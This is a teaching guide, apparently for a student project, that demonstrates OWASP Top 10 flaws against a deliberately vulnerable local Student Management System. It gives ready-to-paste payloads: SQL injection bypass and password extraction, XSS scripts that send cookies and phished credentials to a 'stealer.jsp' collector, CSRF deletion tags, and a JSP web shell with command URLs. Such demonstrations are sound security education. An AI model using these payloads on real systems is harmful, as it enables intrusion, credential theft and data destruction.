# OWASP Top 10 Practical Demonstration Guide

This master guide provides the exact, step-by-step instructions needed to demonstrate multiple OWASP Top 10 vulnerabilities built directly into your **vulnerable** Student Management System to your project guide. 

When presenting your project, you should first demonstrate these attacks on the `student-management-system` folder. Then, switch to the `student-management-system-secure` folder to explain how you patched them (using Prepared Statements, ESAPI, CSRF Tokens, BCrypt, etc.).

### Attack 1: Authentication Bypass (Error-Based / Boolean-Based)

**The Vulnerability:** 
In `UserDAO.java`, the login query is constructed via raw string concatenation:
`String sql = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";`

**The Goal:**
Log in as the Admin user without knowing the password, and demonstrate how a raw database error leaks information.

**The Steps:**
1. Open your browser and navigate to the project login page: `http://localhost:8080/student-management-system/login.jsp`
2. **First, demonstrate the Error Leak (Reconnaissance):**
   * In the **Username** field, type exactly: `'` *(A single quote)*
   * In the **Password** field, type anything.
   * Click **Login**.
   * *Result:* The server crashes with a massive 500 Internal Server error. Point out the "SQLSyntaxErrorException" to your guide, explaining how this proves the database is directly executing user input.
3. **Second, demonstrate the Bypass (Exploitation):**
   * Go back to the login page.
   * In the **Username** field, type exactly this payload:
     `admin' OR '1'='1`
   * In the **Password** field, type anything.
   * Click **Login**.
   * *Result:* You will be logged into the Admin Dashboard!

**Why it works:**
You injected a malicious string that closed the username quote and added an `OR` condition that is always true (`'1'='1'`). Because `1=1` is true, the database ignored the password check entirely.

### Attack 2: Union-Based Data Exfiltration

**The Vulnerability:**
In `StudentDAO.java`, the student search function dynamically builds a `LIKE` clause with user input.

**The Goal:**
Extract hidden data from the `users` table (passwords, admin usernames) directly onto the public student search results page.

**The Steps:**
1. Log in as an Admin.
2. Go to the Admin Dashboard where the Search bar is located.
3. In the Search Bar, paste exactly this payload:
   `' UNION SELECT id, id, username, password, role, 'N/A', 'N/A', 'N/A' FROM users-- `
   *(Note the space after the dashes)*
4. Click **Search**.
5. **The Result:** Look at the table of students. Beneath the legitimate student results, you will see new "students" listed. Their "Full Name" will actually be their backend `username`, and their "Email" will be their raw `password`.

**Why it works:**
The single quote `'` breaks out of the `LIKE` clause. `UNION` tells the database to run a second query and stick its results to the bottom of the first query's results. By writing `SELECT id, id,... FROM users`, we perfectly match the 8 columns required by the `students` table, tricking the HTML table into rendering secret passwords.

### Attack 3: Time-Based Blind Injection

**The Vulnerability:**
Imagine the application was better coded and didn't crash with error messages. We can force the database to "sleep" to prove it's still vulnerable.

**The Goal:**
Force the database to pause for 5 seconds before responding.

**The Steps:**
1. Go to the login page.
2. In the **Username** field, type exactly this payload:
   `admin' AND SLEEP(5)-- `
   *(Note the space after the dashes)*
3. Type anything for the password and click **Login**.
4. **The Result:** The website will instantly "hang" and take exactly 5 seconds to load the next page, proving you can execute arbitrary commands on the database server.

---

## Part 2: Cross-Site Scripting (XSS)

### Attack 4: Reflected Cross-Site Scripting

**The Vulnerability:** 
In `admin_dashboard.jsp`, the search bar takes the user's input (`query`) and reflects it back onto the HTML page to say "Search results for: [input]" without escaping it.

**The Goal:**
Silently steal the Admin's internal session token (cookie) when they click a malicious search link.

**The Steps:**
1. Log in as an Admin.
2. In the **Search Bar**, paste exactly this payload:
   `<script>let img = new Image(); img.src = "http://localhost:8080/student-management-system/stealer.jsp?data=" + encodeURIComponent("STOLEN COOKIE: " + document.cookie);</script>`
3. Click **Search**.
4. **The Victim's Result:** The page simply reloads and says "Search results for:", with a broken script output. It looks like a minor glitch. 
5. **The Hacker's Result:** Go to your Hacker Control Panel (`http://localhost:8080/student-management-system/view_stolen.jsp`). You will see the Admin's literal `secret_token` cookie permanently saved in your logs!

**Why it works:**
The application reflected the input directly into the HTML source code, so the browser executed the invisible image script. By sending the `document.cookie` variable to our hidden `stealer.jsp` server, the hacker has successfully bypassed the browser's origin protections and stolen the identity token.

### Attack 5: Stored Cross-Site Scripting

**The Vulnerability:** 
The Campus Notice Board allows Admins to create "Announcements" containing HTML content. This content is saved to the database and rendered on the homepage without sanitization.

**The Goal:**
Plant a permanent malicious script in the database that will execute on the computer of *every single user* who visits the homepage.

**The Steps:**
1. Log in as an Admin.
2. Go to the **Announcements** management page (or any input field saved to the DB).
3. Click to **Add** a new announcement.
4. For the **Title**, type: `Important Update!`
5. For the **Content**, choose one of these Real-World Payloads (copy exactly as shown, without any extra quotes):

   **Payload 1: Website Defacement (Ransomware Screen)**
   Turns the whole website black with a red warning message.
   ```html
   <script>document.body.innerHTML=`<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:black;color:red;z-index:9999;display:flex;justify-content:center;align-items:center;font-size:50px;font-family:monospace;text-align:center;">SYSTEM COMPROMISED<br>ALL DATA ENCRYPTED</div>`;</script>
   ```

   **Payload 2: The "Silent Data Stealer" (Phishing & Exfiltration)**
   Pops up fake login prompts. When the user types their credentials, it silently sends them to the hacker's server (`stealer.jsp`) using an invisible image request.
   ```html
   <script>let u=prompt("Connection Interrupted. Re-enter Username:"); if(u){let p=prompt("Enter Password:"); if(p){let img = new Image(); img.src = "stealer.jsp?data=" + encodeURIComponent("Username: " + u + " | Password: " + p); alert("Reconnected Successfully.");}}</script>
   ```

6. Click **Submit** to save it to the database.
7. Now, log out and go to the public homepage (`index.jsp`).
8. **The Victim's Experience:** The prompt appears. They type a secret password and hit enter. It just says "Reconnected Successfully." Everything looks normal.
9. **The Hacker's Experience (The Wow Factor):** Open a new browser tab and navigate to your secret Hacker Control Panel: `http://localhost:8080/student-management-system/view_stolen.jsp`. You will see the victim's IP address and stolen password permanently saved on your screen!

**Why it works:**
Stored XSS is devastating because it attacks the users, not the server. Every time an innocent student visits the homepage, the server pulls the malicious script from the database and serves it to them permanently.

---

## Part 3: Broken Access Control

### Attack 6: Insecure Direct Object Reference (IDOR) / URL Parameter Attack

**The Vulnerability:** 
When an admin views a student's profile, the URL looks like `admin_student_details.jsp?id=1`. The application trusts this URL parameter completely without verifying identity authorization on the backend.

**The Goal:**
View the private data of another user simply by changing a number in the URL address bar.

**The Steps:**
1. **As an Admin:** Go to the Admin Dashboard and click on the first student's name to view their details profile (e.g., Rahul). 
2. Look at the URL in your browser: `.../admin_student_details.jsp?id=1`
3. **The Attack:** Click inside the URL bar, delete the `1`, replace it with a `2`, and press Enter.
4. **The Result:** You instantly bypass the UI navigation and pull up the private details for Student ID 2 (e.g., Priya). 

**Why it works:**
The application relies entirely on the URL `?id=` parameter to decide which data to pull from the database. Because the application doesn't implement strict contextual Access Control checks before rendering the page, attackers can easily write scripts to iterate from `id=1` to `id=1000` and mass-download the entire private database.

---

## Part 4: More OWASP Top 10 Vulnerabilities

### Attack 7: Cross-Site Request Forgery (CSRF)

**The Vulnerability:** 
In `AdminServlet.java`, state-changing actions (like deleting a user) can be triggered via a simple URL link. There are no CSRF anti-forgery tokens.

**Method 1: The External Trap (Fake iPhone Website)**
1. **As the Admin:** Ensure you are logged into the portal.
2. **As the Attacker:** Open the `csrf_attack_demo.html` file on your Desktop. 
3. Click the **"Claim Free iPhone"** button.
4. **The Result:** Go back to your dashboard and refresh. Student ID 2 is deleted because your browser invisibly sent the command using your active session.

**Method 2: The Internal Zero-Click (Invisible Image)**
1. **As the Admin:** Go to the Announcements page.
2. **As the Attacker:** Create a new announcement with this payload in the **Content**:
   `<img src="http://localhost:8080/admin?action=delete&id=4" width="0" height="0">`
3. Click **Post**.
4. **The Result:** Log out and log back in as Admin. Simply by viewing the notice board on the homepage, Student ID 4 is instantly deleted without you clicking anything!

**Why it works:**
The browser automatically sends session cookies with cross-site requests. Without Anti-CSRF tokens, the server cannot tell the difference between a real admin action and a forged one triggered by a malicious site or a hidden image.

### Attack 8: Cryptographic Failures (A02:2021)

**The Vulnerability:** 
Open the project's `database.sql` file and show it to your guide. Look at the `users` table: passwords like `admin123` and `pass123` are stored in plain text.

**The Goal:**
Demonstrate a catastrophic failure to protect data at rest.

**The Result:** 
Explain that because of this flaw, the Union-Based SQL Injection you performed earlier was devastating. If the database used strong, salted hashing (like Argon2 or BCrypt), the extracted passwords would be useless gibberish. Because they are plain text, the entire application is compromised the moment a read-vulnerability occurs.

### Attack 9: Security Misconfiguration (A05:2021)

**The Vulnerability:** 
Return to your demonstration of the **Error-Based SQL Injection** (typing `'` into the login field).

**The Result:**
Point out the massive "HTTP Status 500 – Internal Server Error" page. This is a primary example of Security Misconfiguration. Production environments should *never* display explicit stack traces to end users. The Tomcat server is misconfigured (or the Java app lacks a global exception handler) to bleed architectural secrets, file paths, and database versions directly to the public internet, giving attackers the exact blueprints they need to craft advanced payloads.

### Attack 10: Identification and Authentication Failures (A07:2021)

**The Vulnerability:** 
Look at the `login.jsp` and `LoginServlet.java` files.

**The Result:**
Explain to your guide that there is absolutely no Rate Limiting, Account Lockout mechanism, or CAPTCHA implemented. An attacker can use a tool like Burp Suite or Hydra to send 10,000 password guesses a minute to the login page without ever being blocked.

### Attack 11: Security Logging and Monitoring Failures (A09:2021)

**The Vulnerability:** 
Check the console output of your Tomcat Server/Java application.

**The Result:**
Explain that when you performed the brute force attacks, or when the SQL injections failed and threw massive exceptions, the application recorded zero security events. There are no log files tracking failed logins by IP address, nor alerts sent to an administrator when 50 syntax errors happen in one minute. In the real world, this means a breach could go active for months without the organization ever noticing.

---

## Part 5: The Final Top 10 Vulnerabilities

### Attack 12: Insecure File Upload & OS Command Injection (Remote Code Execution)

**The Vulnerability:** 
In `upload_profile.jsp`, the application allows users to upload a profile picture without validating the file type or contents.

**The Steps:**
1. Create a new text file named `webshell.jsp` and paste this code: `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`
2. Log in as a Student and upload this file via the **Update Profile** page.
3. **The Attack:** Navigate to the uploaded file and pass a command in the URL:
   `http://localhost:8080/uploads/webshell.jsp?cmd=[COMMAND]`

**Top Commands to Show Your Guide (Copy & Paste these URLs):**
*   **Pop Calculator (Visual Hacking):** 
    `http://localhost:8080/uploads/webshell.jsp?cmd=calc.exe`
*   **Check User Privileges:** 
    `http://localhost:8080/uploads/webshell.jsp?cmd=whoami`
*   **Network Configuration:** 
    `http://localhost:8080/uploads/webshell.jsp?cmd=ipconfig`
*   **List Running Tasks:** 
    `http://localhost:8080/uploads/webshell.jsp?cmd=tasklist`
*   **Open Notepad:** 
    `http://localhost:8080/uploads/webshell.jsp?cmd=notepad.exe`

**Why it works:**
The server blindly saves and **executes** the `.jsp` file instead of treating it as a static image. By using `Runtime.exec()`, we bridge the gap between the web application and the underlying Operating System, granting the attacker full control of the computer.

### Attack 13: Cross-Site Request Forgery (CSRF)

**The Vulnerability:** 
In the vulnerable application, the **Delete Announcement** action on the `admin_announcements.jsp` page is implemented using a simple `GET` request without any CSRF tokens (`admin?action=delete_announcement&id=X`). Because it uses `GET` and lacks tokens, an external malicious website can force an admin's browser to make this request silently in the background.

**The Goal:**
Trick the Admin into visiting a malicious webpage, which will silently force the Admin's browser to delete an important announcement from the portal without their knowledge.

**The Steps:**
1. Log into the vulnerable system as the **Admin**. Let the tab remain open.
2. Go to **Manage Announcements** and identify an announcement. Note its ID (e.g., hover over the Delete button and see `id=4`). Let's assume the ID is `4` for this example.
3. Open the Hacker's C2 Server panel in a separate browser tab: `http://localhost:8080/student-management-system/stealer.jsp`
4. In the `stealer.jsp` code (or any other malicious HTML page you create), the attacker can embed a hidden image tag like this:
   `<img src="http://localhost:8080/student-management-system/admin?action=delete_announcement&id=4" style="display:none;" />`
   *(Alternatively, just open a new tab and paste that URL to simulate the malicious site loading it).*
5. The moment the malicious page loads, the browser automatically tries to load the "image" by making a GET request to that URL. 
6. Because the Admin is already logged in on the first tab, the browser attaches their session cookies to the request.
7. **The Result:** Go back to the Admin Announcements page and refresh. Announcement #4 has been silently deleted!

**Why it works:**
The server cannot distinguish between a legitimate request made by the Admin clicking the "Delete" button, and a forged request made automatically by a malicious script/image tag on a different website. Because the session cookie is sent automatically, the server assumes the Admin authorized the deletion.y.
